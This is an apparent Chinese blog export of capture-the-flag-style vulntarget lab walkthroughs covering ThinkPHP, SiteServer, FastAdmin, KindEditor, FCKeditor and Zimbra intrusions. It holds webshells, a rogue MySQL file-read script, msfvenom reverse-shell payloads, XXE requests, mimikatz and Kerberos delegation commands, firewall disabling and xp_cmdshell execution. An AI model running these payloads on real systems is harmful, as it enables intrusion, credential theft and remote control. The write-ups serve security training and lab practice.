phpinfo也会被拦，还可以通过file_put_contents写文件，但是当前的目录没有权限不可写，需要目录穿越到根目录下

通过三次url编码的加密成功写入
?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][0]=../../1.php&amp;vars[1][1]=%3C?php%20eval(urldecode(urldecode(urldecode($_REQUEST[cmd]))));?%3E


然后蚁剑连接时还需要编写一下蚁剑的编码规则以及host即可成功连接
&#x27;use strict&#x27;;   // ##########    请在下方编写你自己的代码   ###################function forceEncode(s) &#123;  return Array.from(s).map(i=&gt;&#x27;%&#x27;+i.charCodeAt(0).toString(16).padStart(2,&#x27;0&#x27;)).join(&#x27;&#x27;)&#125; module.exports = (pwd, data, ext=&#123;&#125;) =&gt; &#123;  const payload = data[&#x27;_&#x27;]  data[pwd] = forceEncode(forceEncode(payload));  delete data[&#x27;_&#x27;];  console.log(data);  return data;&#125;




连上后发现命令都是不可执行的，说明存在disable_function

这里我们可以使用**php7-gc-bypass**绕过disable_function并执行系统命令

信息收集发现还有个192.168.88.100的网卡

在&#x2F;home&#x2F;vulntarget路径下发现了key文件，将其dump下来


前面扫端口的时候就发现开放了ssh，所以尝试使用key连接ssh，最终尝试使用root成功登录

关闭防火墙
# 关闭防火墙ufw disable# 查看防火墙状态ufw status


上传fscan扫一下内网，发现主机192.168.88.102开放了135、445、1433端口，存在SQL server服务

通过工具hydra爆破smb得到账号密码：administrator&#x2F;admin@123
hydra -L user.txt -P pass.txt 192.168.88.102 smb


通过工具**wmiexec.py**远程执行成功上线

信息搜集发现还有个10.0.10的网卡

发现存在域vulntarget.com

关闭防火墙
netsh advfirewall set allprofiles state offnetsh advfirewall show allprofile state

然后使用下面的命令打开3389端口
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f

成功进入远程桌面

约束性委派攻击上传mimikatz、ADFind、kekeo，探测win2008是否存在约束委派
mimikatz获取密码：win2008&#x2F;qweASD123
# 提升权限privilege::debug# 抓取密码sekurlsa::logonpasswords


查找约束性委派主机，可以发现存在约束委派
# 约束委派的查找# -u 任意用户，-up 密码，-b 域， -f 委派属性AdFind.exe -h 10.0.10.128 -u win2008 -up qweASD123  -b &quot;DC=nami,DC=com&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto


# 清除票据缓存mimikatz &quot;privilege::debug&quot; &quot;kerberos::purge&quot; &quot;exit&quot;

已经知道服务用户明文的条件下，可以使用kekeo请求win2008的TGT
# 请求该用户的TGT# /user: 服务用户的用户名# /password: 服务用户的明文密码# /domain: 所在域名# /ticket: 指定票据名称，不过这个参数没有生效，可以忽略tgt::ask /user:win2008 /domain:vulntarget.com /password:qweASD123 /ticket:ash.kirbi# 申请administrator权限的票据tgs::s4u /tgt:TGT_win2008@VULNTARGET.COM_krbtgt~vulntarget.com@VULNTARGET.COM.kirbi /user:Administrator@vulntarget.com /service:cifs/WIN-1PV25H8UJPN.vulntarget.com


利用mimikatz导入S4U2proxy阶段生成的ST
kerberos::ptt TGS_Administrator@vulntarget.com@VULNTARGET.COM_cifs~WIN-1PV25H8UJPN.vulntarget.com@VULNTARGET.COM.kirbi


dir访问域控
dir \\WIN-1PV25H8UJPN.vulntarget.com\C$


然后net user添加一个域用户，并加入到域管理员中
net user admin123 admin@1234 /add /domainnet group &quot;domain admins&quot; admin123 /add /domain

最后使用wmiexec远程执行成功上线

后面维权可以看这篇文章

https://mp.weixin.qq.com/s/EBA7iUUs0wJcODdY1iybLg

]]></content>
      <categories>
        <category>靶场通关</category>
      </categories>
      <tags>
        <tag>vulntarget</tag>
      </tags>
  </entry>
  <entry>
    <title>vulntarget-i</title>
    <url>/2022/12/12/vulntarget-i/</url>
    <content><![CDATA[
机器密码：
2008-1：
administrator&#x2F;QwE123asd；vulntarget&#x2F;123.com
后台：admin&#x2F;admin8888；数据库：root&#x2F;8B..123admin
2008-2：
administrator&#x2F;zxcvbnm；xiaoming&#x2F;Vme50..
后台管理：admin&#x2F;8B..123admin (v7)；administrator&#x2F;8B..123admin (v6)
2012：
xiaopao&#x2F;CrazyThursday；administrator&#x2F;asdfghjkl
数据库：管理员 sa&#x2F;QwE123asd；普通权限xiaopao&#x2F;123.com
拓扑图：


信息收集扫描存活主机和端口，发现开放了80、135、139、445、3306、5985、8000、47001等端口

访问web显示是IIS7，没有什么有用信息

访问8000端口显示是米拓信息，搜索可知是个企业建站系统

扫目录发现存在adminer4.4.0，搜索漏洞可以发现有个任意文件读取漏洞

漏洞利用
https://github.com/ev0A/Mysqlist

字典脚本如下：
# -*- coding: utf-8 -*-import socketimport osimport sys #--------------------------------------------------------------------------------------------------------------------port = int(sys.argv[1])#-------------------------------------------------------------------------------------------------------------------- def mysql_get_file_content(sv, filename):    conn, address = sv.accept()    logpath = os.path.abspath(&#x27;.&#x27;) + &quot;/log/&quot; + address[0]    if not os.path.exists(logpath):        os.makedirs(logpath)     conn.sendall(&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;)    conn.recv(9999)     conn.sendall(&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;)    conn.recv(9999)     wantfile = chr(len(filename) + 1) + &quot;\x00\x00\x01\xFB&quot; + filename    conn.sendall(wantfile)    content = conn.recv(9999)    conn.close()     if len(content) &gt; 4:        with open(logpath + &quot;/&quot; + filename.replace(&quot;/&quot;, &quot;_&quot;).replace(&quot;:&quot;, &quot;_&quot;), &quot;w&quot;) as txt:            txt.write(content)        return True    else:        return False # 开始监听sv = socket.socket()sv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)sv.bind((&quot;&quot;, port))sv.listen(5)print &quot;Listen Begin in port &quot;+str(port)# 日志文件夹  # 循环监听while True:    filename = raw_input(&quot;请输入接下来你想读的文件名 (直接按回车退出): &quot;)    if filename == &quot;&quot;:        break    res = mysql_get_file_content(sv, filename)    if res:        print &quot;Read Success! ---&gt; &quot;+filename    else:        print &quot;Not Found~ ---&gt; &quot;+filename

运行脚本，直接输入想要读取的文件绝对路径adminer.php，然后adminer页面输入攻击机kali的IP，用户名密码数据库可以随便输一个，点击登录

这里可以看到我们读取成功的文件会被记录到log文件夹中

读取mysql的配置文件，根据报错信息发现是phpstudy

然后我们可以探测一下phpstudy的默认路径/phpstudy_pro/www发现并不是默认的路径，下载源码进行分析发现是在config下的，但是需要绝对路径，再到IIS的看看发现有安全狗


IIS有两个默认的读取绝对路径的方法
C:\Windows\System32\inetsrv\MetaBase.xmlC:\Windows\System32\inetsrv\config\applicationHost.config
这里读取的时候会发现上面的脚本不太行了，读取到的文件不完整，又换了个还是不完整


只能修改代码读取完整的大文件，用while循环读取文件，修改如下：
# -*- coding: utf-8 -*-import socketimport osimport sys #--------------------------------------------------------------------------------------------------------------------port = int(sys.argv[1])#-------------------------------------------------------------------------------------------------------------------- def mysql_get_file_content(sv, filename):    conn, address = sv.accept()    logpath = os.path.abspath(&#x27;.&#x27;) + &quot;/log/&quot; + address[0]    if not os.path.exists(logpath):        os.makedirs(logpath)     conn.sendall(&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;)    conn.recv(99999999)     conn.sendall(&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;)    conn.recv(99999999)     wantfile = chr(len(filename) + 1) + &quot;\x00\x00\x01\xFB&quot; + filename    conn.sendall(wantfile)    conn.sendall(&#x27;asdfsadfsadfsa&#x27;)    content = &#x27;asdfasdf&#x27;  # 初始进入循环        if len(content) &gt; 4:        with open(logpath + &quot;/&quot; + filename.replace(&quot;/&quot;, &quot;_&quot;).replace(&quot;:&quot;, &quot;_&quot;), &quot;w&quot;) as txt:            while len(content) !=0:                content = conn.recv(99999999)                txt.write(content)        return True    else:        return False    # if len(content) &gt; 4:    #     with open(logpath + &quot;/&quot; + filename.replace(&quot;/&quot;, &quot;_&quot;).replace(&quot;:&quot;, &quot;_&quot;), &quot;w&quot;) as txt:    #         txt.write(content)    #     return True    # else:    #     return False sv = socket.socket()sv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)sv.bind((&quot;&quot;, port))sv.listen(5)print &quot;Listen Begin in port &quot;+str(port)  while True:    filename = raw_input(&quot;请输入接下来你想读的文件名 (直接按回车退出): &quot;)    if filename == &quot;&quot;:        break    res = mysql_get_file_content(sv, filename)    if res:        print &quot;Read Success! ---&gt; &quot;+filename    else:        print &quot;Not Found~ ---&gt; &quot;+filename

可以得到IIS的网站的绝对路径以及安全狗的绝对路径
C:\vulnIIS\俱乐部C:\Program Files (x86)\SafeDog\SafeDogSiteIIS\



后来探测中发现不用跟绝对路径也是能成功读取的，于是使用相对路径读取config_db.php配置文件，从而得到数据库账号密码：root&#x2F;8B..123admin

成功登录数据库

进入后尝试通过日志getshell，首先查看secure_file_priv参数，发现为空有可读可写的权限
# 查看secure_file_priv参数信息是否为空show global variables like &#x27;%secure%&#x27;


查看配置信息发现general log是关了的，需要开启general log模式
show variables like &#x27;%general%&#x27;;set global general_log=on



然后尝试能否写入，发现可以执行成功但是访问却报404
select &#x27;test&#x27; into dumpfile &#x27;C:\\vulnIIS\\俱乐部\\test.txt&#x27;



接着再执行一次命令显示文件已经存在，再回头看这里我们的路径存在中文，因此可以猜测这是编码问题所导致的

先来查看一下mysql的默认表，可能编码的不同导致这个中文跟符号融合了输出在vulnIIS目录下
show variables like &#x27;character%&#x27;


# 指定数据库字符集还是失败set character_set_client=&#x27;gbk&#x27;;set character_set_connection=&#x27;gbk&#x27;;set character_set_database=&#x27;gbk&#x27;;set character_set_results=&#x27;gbk&#x27;;set character_set_server=&#x27;gbk&#x27;;select &#x27;test&#x27; into outfile &#x27;C:\\vulnIIS\\俱乐部\\1.txt&#x27;;

这里使用插件FH-Charset将网页编码设置成GBK，可以发现成功写入


接着我们通过创建表的方式写入来绕安全狗，先将冰蝎的aspx马转hex
3c25402050616765204c616e67756167653d2243232220253e3c2540496d706f7274204e616d6573706163653d2253797374656d2e5265666c656374696f6e22253e3c2553657373696f6e2e41646428226b222c226534356533323966656235643932356222293b202f2ae8afa5e5af86e992a5e4b8bae8bf9ee68ea5e5af86e7a0813332e4bd8d6d6435e580bce79a84e5898d3136e4bd8defbc8ce9bb98e8aea4e8bf9ee68ea5e5af86e7a08172656265796f6e642a2f627974655b5d206b203d20456e636f64696e672e44656661756c742e47657442797465732853657373696f6e5b305d202b202222292c63203d20526571756573742e42696e6172795265616428526571756573742e436f6e74656e744c656e677468293b417373656d626c792e4c6f6164286e65772053797374656d2e53656375726974792e43727970746f6772617068792e52696a6e6461656c4d616e6167656428292e437265617465446563727970746f72286b2c206b292e5472616e73666f726d46696e616c426c6f636b28632c20302c20632e4c656e67746829292e437265617465496e7374616e636528225522292e457175616c732874686973293b253e0a

然后再去创建一个表
create table test(test1 blob);    # blob被视为二进制字符串


写入内容
insert into test values (convert(0x3c25402050616765204c616e67756167653d2243232220253e3c2540496d706f7274204e616d6573706163653d2253797374656d2e5265666c656374696f6e22253e3c2553657373696f6e2e41646428226b222c226534356533323966656235643932356222293b202f2ae8afa5e5af86e992a5e4b8bae8bf9ee68ea5e5af86e7a0813332e4bd8d6d6435e580bce79a84e5898d3136e4bd8defbc8ce9bb98e8aea4e8bf9ee68ea5e5af86e7a08172656265796f6e642a2f627974655b5d206b203d20456e636f64696e672e44656661756c742e47657442797465732853657373696f6e5b305d202b202222292c63203d20526571756573742e42696e6172795265616428526571756573742e436f6e74656e744c656e677468293b417373656d626c792e4c6f6164286e65772053797374656d2e53656375726974792e43727970746f6772617068792e52696a6e6461656c4d616e6167656428292e437265617465446563727970746f72286b2c206b292e5472616e73666f726d46696e616c426c6f636b28632c20302c20632e4c656e67746829292e437265617465496e7374616e636528225522292e457175616c732874686973293b253e0a,char));


成功写入

将其导入IIS网站目录下（这里还是得使用插件将其转为GBK
select test1 from test into dumpfile &#x27;C:\\vulnIIS\\俱乐部\\1.aspx&#x27;;


最后冰蝎成功连接

信息收集一波，是个低权限的，还有个192.168.30.131的网卡，打了四个补丁


土豆提权
尝试烂土豆提权失败，换端口也是失败告终


尝试多汁土豆提权失败

尝试PipePotato失败

后面使用msf再尝试一下烂土豆提权
msf生成木马再通过冰蝎上传
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.150.128 lport=4444 -f exe &gt; msf.exe

msf成功上线
use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.150.128run

列出tokens，当前shell用户只是一个普通的用户，权限低，也就意味着shell的访问级别低，所以令牌只有当前用户本身
use incognitolist_tokens -u


上传烂土豆并执行，可以看到已经有的system的令牌，然后模拟该令牌，成功提权
execute -cH -f potato.exelist_tokens -uimpersonate_token &quot;NT AUTHORITY\SYSTEM&quot;


提权后使用猕猴桃抓一下密码

需要先将进程迁移到x64位上去

再执行一下即可获取到密码：Administrator&#x2F;QwE123asd

msf这边shell用的不方便，我们还可以通过cs插件进行烂土豆提权也能成功，这里就直接通过提权后的msf运行cs马上线

首先关闭防火墙
netsh advfirewall set allprofiles state offnetsh advfirewall show allprofile state


然后使用下面的命令打开3389端口
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f


成功登录远程桌面

在普通用户vulntarget中的桌面文件发现搜狗浏览器，打开看看是否有什么保存的密码

但是去设置中查看并没有

然后尝试通过登录普通用户查找，根据前面hashdump的解密得到vulntarget用户的密码：123.com

成功得到管理后台的账号密码administrator&#x2F;8B..123admin

内网渗透上传frp建立代理
./frps -c ./frps.ini


frpc.exe -c ./frpc.ini &amp;


再上传fscan扫一下内网，发现主机192.168.30.130开放了80、135、445、8000端口

访问8000端口是空白的，只显示出一个logo

根据前面搜狗中访问保存的后台可以知道路径是/SiteServer/pageLogin.cshtml

然后尝试登录后台发现报错

搜了下报错是数据库配置问题，但是靶机连数据库文件一直出问题，后面修复初始环境的快照结果就解决了，但是没过多久又不行了，没有连接到mssql服务器，于是直接把IP改成10.0.10的

接着搜索SiteServer CMS 6.15.51漏洞发现可能存在sql注入漏洞**CVE-2021-42656**，不过没复现成功
后面看wp说是可以利用模板下载漏洞getshell（前面有看到但是介绍里是说对5.0版本包含5.0以下通杀就没尝试
首先写一个aspx马，再对其进行压缩，并上传至IIS的网站的目录下
&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%var a = Request.Form(&quot;abc&quot;);var b = &quot;un&quot;;var a2 = &quot;fe&quot;;var c2 = &quot;sa&quot;;function fun ()&#123;return a ;&#125;eval(fun(),b+c2+a2);%&gt;

然后去**菜鸟教程**上在线编译C#程序，得到字符串：ZjYIub&#x2F;YxA2nuEGSiGmc+ZyLUMtltzqK7OLPFo1MTHw&#x3D;
using System; using System.IO; using System.Security.Cryptography; using System.Text; namespace EncryptApplication &#123; class Encrypt     &#123; static void Main(string[] args)       &#123;         var _encryptKey = &quot;vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5&quot;;         var _decryptKey = &quot;vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5&quot;;        var _inputString = &quot;http://192.168.30.131/1.zip&quot;;    # 只需要修改此处的地址        var _outString = &quot;&quot;; var _noteMessage = &quot;&quot;;        byte[] iv = &#123; 0x12, 0x34, 0x56, 0x78, 0x90, 0xAB, 0xCD, 0xEF &#125;;        try&#123;            var byKey = Encoding.UTF8.GetBytes(_encryptKey.Length &gt; 8 ? _encryptKey.Substring(0, 8) : _encryptKey);           var des = new DESCryptoServiceProvider();           var inputByteArray = Encoding.UTF8.GetBytes(_inputString);           var ms = new MemoryStream();           var cs = new CryptoStream(ms, des.CreateEncryptor(byKey, iv), CryptoStreamMode.Write);     cs.Write(inputByteArray, 0, inputByteArray.Length);         cs.FlushFinalBlock();          _outString = Convert.ToBase64String(ms.ToArray());          Console.WriteLine(&quot;DesEncrypt:&quot;); Console.WriteLine(_outString); &#125;      catch (Exception error) &#123; _noteMessage = error.Message; &#125;  &#125; &#125; &#125;


我们对此字符串再进行一次混淆
&quot;+&quot; =&gt; &quot;0add0&quot;&quot;=&quot; =&gt; &quot;0equals0&quot;&quot;&amp;&quot; =&gt; &quot;0and0&quot;&quot;?&quot; =&gt; &quot;0question0&quot;&quot;/&quot; =&gt; &quot;0slash0&quot; # ZjYIub0slash0YxA2nuEGSiGmc0add0ZyLUMtltzqK7OLPFo1MTHw0equals0

访问如下url（downloadUrl后添加混淆后的字符串，directoryName后修改为压缩文件的名称
http://192.168.30.130:8000/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&amp;userKeyPrefix=test&amp;downloadUrl=ZjYIub0slash0YxA2nuEGSiGmc0add0ZyLUMtltzqK7OLPFo1MTHw0equals0&amp;directoryName=1

然后拿蚁剑或者菜刀去连接即可
http://192.168.30.130:8000/SiteFiles/SiteTemplates/1/1.aspx 密码：abc

但是这里我没有实现，跟着wp中的另一种方法再进行复现一下
getshell首先在设置管理-上传设置处添加上传图片类型aspx并修改上传文件夹为SiteFiles/SiteTemplates

然后在显示管理-内容管理处上传图片会显示重命名后的文件路径

这回就上传成功了，通过蚁剑成功连接（这里回显的上传文件名是t_xxx，所以需要把t_去掉

连上后进行信息收集，发现和之前的一样是个低权限的，还有个10.0.10.100的网卡，打了四个补丁，并且还不出网

于是利用第一台主机做跳板机转发上线，点击Plvoting-Listener进行设置监听

制作exe木马，上传靶机执行上线，然后就还是和前面一样使用烂土豆提权

接着我们读取cms数据库配置文件得到数据库账号密码：xiaopao&#x2F;123.com

查看IP发现不在本地上存在双网站库分离环境，设置代理连接数据库，解密得到账号密码sa&#x2F;QwE123asd

文件落地启用OLE组件
exec master.dbo.sp_configure &#x27;show advanced options&#x27;, 1RECONFIGUREexec master.dbo.sp_configure &#x27;Ole Automation Procedures&#x27;, 1RECONFIGURE

把cs生成的马转hex
import binasciifilename = &#x27;beacon.exe&#x27;with open(filename, &#x27;rb&#x27;) as f:    content = f.read()print(binascii.hexlify(content))

再把hex放在OLE组件内并创建命令执行存储过程
DECLARE @DATAVARBINARY(MAX)= 0x-hex        # 填入自己转的hex    DECLARE @filepath VARCHAR(MAX)=&#x27;C:\\Windows\\temp\\cs.exe&#x27;    DECLARE @ObjectToken INT    EXEC sp_OACreate &#x27;ADODB.Stream&#x27;, @ObjectToken OUTPUT    EXEC sp_OASetProperty @ObjectToken,&#x27;Type&#x27;,1    EXEC sp_OAMethod @ObjectToken,&#x27;Open&#x27;    EXEC sp_OAMethod @ObjectToken,&#x27;Write&#x27;,NULL, @DATA    EXEC sp_OAMethod @ObjectToken,&#x27;SaveToFile&#x27;,NULL, @filepath,2    EXEC sp_OAMethod @ObjectToken,&#x27;Close&#x27;    EXEC sp_OADestroy @ObjectToken    SELECT @filepath

成功上线CS
exec master..xp_cmdshell &quot;cmd /c C:\\Users\\Public\\Downloads\\n.exe&quot;]]></content>
      <categories>
        <category>靶场通关</category>
      </categories>
      <tags>
        <tag>vulntarget</tag>
      </tags>
  </entry>
  <entry>
    <title>vulntarget-j</title>
    <url>/2023/01/04/vulntarget-j/</url>
    <content><![CDATA[
机器密码：
windows server 2012：workstation&#x2F;admin@20221123、administrator&#x2F;nimda2toor@2102；cms账密：admin&#x2F;admin123
windows server 2019：test&#x2F;admin@221125；cms账密：admin&#x2F;4n362pR4ExakFab
拓扑图：


信息收集扫描存活主机和端口，发现开放了80、3389、5985、7001端口

访问80端口如下：

5985和7001端口访问都是报404、403


漏洞利用这里根据报错可以判断出该网站是FastAdmin搭建的

有注册功能，我们可以尝试一下FastAdmin前台分片传输上传文件getshell，先在前台注册一个普通用户

登陆后在个人资料头像处抓包并上传图片

更改上传数据包，发现无法利用

通过上帝视角也能看到它关闭了分片传输

再尝试会员中心前台getshell，还是在上传修改头像处抓包后修改图片数据（满足图片头格式即可）发现还是无法利用

还有FastAdmin后台getshell，但是这里并不是默认的admin被修改了，扫目录也没啥发现
再来看看5985和7001端口，其中7001在扫目录时发现存在KindEditor服务

首先访问/kindeditor.js查看版本信息，得知其版本为3.5.5

搜一下相关漏洞发现存在文件上传和遍历目录漏洞，尝试访问一下路径是否存在有必要验证文件upload_json.*和 file_manager_json.*，前面扫目录可知应该是在/php下，发现如下路径可利用
/php/file_manager_json.php

因为这里没上传点传shell，于是尝试目录遍历，接着试一下列目录
/php/file_manager_json.php?path=/


再访问../发现可以成功读取
/php/file_manager_json.php?path=../


接着再进行读取发现../../被ban了，可通过.././../绕过
/php/file_manager_json.php?path=.././../


这里我们可以看到Fastadmin，通过访问目录/fastadmin/public/得到Fastadmin后台地址FNeSOgYGkp.php
/php/file_manager_json.php?path=.././../fastadmin/public/


然后尝试弱口令admin&#x2F;admin123成功登录后台

于是可以开始尝试后台getshell
getshell1失败，利用需要用到超级管理员权限，打开菜单规则 &gt; 菜单规则 (auth&#x2F;rule) &gt; 编辑，条件规则处写入

然后创建一个低权限管理员，登录访问后台首页，然而并未被执行
getshell2失败，后台 &gt; 插件管理 &gt; 如果有文件管理器可直接上传 shell（在线文件管理器要花钱，打扰了再见
https://github.com/WenchaoLin/Filex（GitHub上翻到一个但是装不上没法用
getshell3失败，后台 &gt; 插件管理 &gt; 如果有命令执行插件，打开命令执行插件 &gt; 一键生成 API 文档 &gt; 如图

点击生成命令行，然后点击立即执行显示不支持的命令参数
getshell4失败，后台 &gt; 插件管理 &gt; 在Fastadmin官网去下载一个example 插件压缩包，采用离线安装模式
打开下载的example插件压缩包，更改Example.php文件中启用插件的地方如下：
/**    * 插件启用方法    */   public function enable()   &#123;       file_put_contents(&#x27;../public/1.php&#x27;,&#x27;&lt;?php phpinfo();?&gt;&#x27;);       Menu::enable(&#x27;example&#x27;);   &#125;

更改完成，离线上传安装，点击启用插件，会在根目录生成 1.php，然而改完插件就会无法添加

getshell5失败，还有个cve-2021-43117，但是他这后台也没有分类管理功能块

这把Fastadmin的洞都玩了一遍呀😂最后通过上帝视角查看一下版本是1.3.3.20220121，这么新版本要掏day打嘛~ 🐏完还不太舒服再加上元旦就摸了
后面问crow师傅要了wp得知getshell6的方式，其实就是getshell3那个，利用file_put_contents把内容写入到文件中，安装成功在线命令的插件后发送以下数据包，但是还是不支持的命令参数呀🤡
POST /FNeSOgYGkp.php/command/command/action/execute HTTP/1.1Host: 192.168.150.145Content-Length: 106Accept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Origin: http://test.testAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: sidebar_collapse=0; multiplenav=0; show_submenu=1; PHPSESSID=j98cses8ijabrq4b64a7ev5eup; think_var=zh-cn; uid=2; token=ce525498-a21d-45f1-a45b-e9d27d445131Connection: close commandtype=api&amp;force=0&amp;url=&amp;output=api.php&amp;template=&amp;title=%3C%3Fphp+phpinfo()%3B%3F%3E&amp;author=&amp;language=


这里假装成功了（直接上帝之手操作一波略过这里，后面得知可能是我当时没注意下了新版本的插件，得下1.0的插件就可以成功利用，还是自己手法不行

再写入一句话，蚁剑成功连接

但是这里蚁剑有些命令不能执行，估计是有杀软阻止了

内网渗透上传免杀的fscan扫一下内网，发现存在主机10.0.0.222，开放了80、135、445、8000、18000端口

访问8000端口如下：

接着扫目录得到/home路径，发现存在sscms服务，但是报错显示用户中心已被禁用

再来看看18000端口，访问报错403，扫目录得到/license.txt路径，发现存在fckeditor服务

目录拼接得到三个具有上传功能的目录如下：
/editor/filemanager/connectors/test.html/editor/filemanager/connectors/uploadtest.html/editor/filemanager/browser/default/browser.html




尝试上传冰蝎🐎发现上传失败


最后一个上传没反应应该也是不行

接着使用工具Webshell_Generate生成asp的免杀webshell

上传时通过burp抓包查看

再来上传一下其他正常的文件试试，例如txt，发现可以成功上传

接着通过%00进行截断上传，第一次上传后是20230104085427.asp_txt

然后第二次就可以成功上传asp文件

最后蚁剑成功连接

但是这里蚁剑是无法执行命令

于是再利用工具Webshell_Generate生成一个冰蝎的免杀webshell，通过%00进行截断上传，最后冰蝎成功连接

这里就可以成功执行命令，可以得知打了补丁KB4464455

CVE-2020-0787本地提权直接GitHub下载BitsArbitraryFileMoveExploit.exe，不过冰蝎和蚁剑都不能直接上传，就再通过%00进行截断上传，但是运行时报错了，应该是有杀软

查看进程发现开着defender

后面查看官方wp知道可以通过cs免杀wdf上线cs，在桌面发现rdp账密test admin@221125，然后用cs自带的代理成功rdp，最终运行BitsArbitraryFileMoveExploit.exe提权

]]></content>
      <categories>
        <category>靶场通关</category>
      </categories>
      <tags>
        <tag>vulntarget</tag>
      </tags>
  </entry>
  <entry>
    <title>vulntarget-f</title>
    <url>/2022/12/13/vulntarget-f/</url>
    <content><![CDATA[
机器密码：
外网centos：root&#x2F;vulntarget-f
内网Ubuntu、二层内网Ubuntu：root&#x2F;Vulntarget#
拓扑图：


准备工作由于外网centos这台机器找不着密码，试了好多个也都不对，于是这里我们重置一下centos的密码
重启开机，在第一行按e，进行编辑：①.ro改为rw②.在LANG=en_US.UFT-8后面添加init=/bin/sh按Ctrl+X重启进入命令行输入passwd修改密码vi /etc/sysconfig/selinux    # 关闭selinux，它这里就是disable的，所以不需要改动exec /sbin/init        # 重启系统，完成重置密码

后面打的时候发现重置完&#x2F;tmp目录下的都会被清空，会导致无法获取flag，就直接恢复快照后神奇的发现又能扫到目标主机了；然后就是centos这台环境说是有点问题的要根据文档搭一遍，不过我这边恢复快照环境正常没出现问题，有问题可以根据下面文档自行搭建

https://mp.weixin.qq.com/s/t_vxF2EivycI_1WEjunEIg

信息收集扫描存活主机和端口，发现开放了22、443等端口，存在Zimbra
访问web如下：
漏洞利用可以利用msf中自带的进行攻击

msf上线后反弹shell，并生成交互式的shell
python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;


在root目录下发现flag，但是权限不够无法cat flag，所以需要提权，先信息收集一下

Linux内核提权都试了下并没成功，后面看了下是在/tmp/login_data/root下找到root密码：vulntarget-f

得到flag：vulntarget-f{——dsjlkfj489rjgr—-}

前面就是为了测试一下外网centos是否正常直接利用msf现成的，为了减少对msf的依赖，后面再来手工打一下看看，可以通过xxe与ssrf完成上传webshell

Zimbra的配置文件在/conf/localconfig.xml，里面有保存到一些配置信息的用户名和密码

首先尝试下CVE-2019-9670 XXE漏洞，可以成功读到&#x2F;etc&#x2F;passwd
poc如下：
POST /Autodiscover/Autodiscover.xml/ HTTP/1.1Host: 192.168.150.141:7071Cookie: ZA_SKIN=serenity; ZA_TEST=true; ZM_TEST=trueUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Cache-Control: max-age=0Content-Type: application/xmlTe: trailersConnection: closeContent-Length: 346 &lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt; &lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&quot;&gt;    &lt;Request&gt;      &lt;EMailAddress&gt;aaaaa&lt;/EMailAddress&gt;      &lt;AcceptableResponseSchema&gt;&amp;xxe;&lt;/AcceptableResponseSchema&gt;    &lt;/Request&gt;  &lt;/Autodiscover&gt;


然后我们开始构造payload来读取Zimbra的配置文件，其中xml文件需要加上CDATA标签才能作为文本读取，并且xxe不能内部实体进行拼接，所以我们通过kali起个web服务来构造外部dtd，再用前面的那个包请求xml得到密码：XbVaoX3Y
poc.dtd
&lt;!ENTITY % file SYSTEM &quot;file:../conf/localconfig.xml&quot;&gt;&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY fileContents &#x27;%start;%file;%end;&#x27;&gt;&quot;&gt;

poc如下：
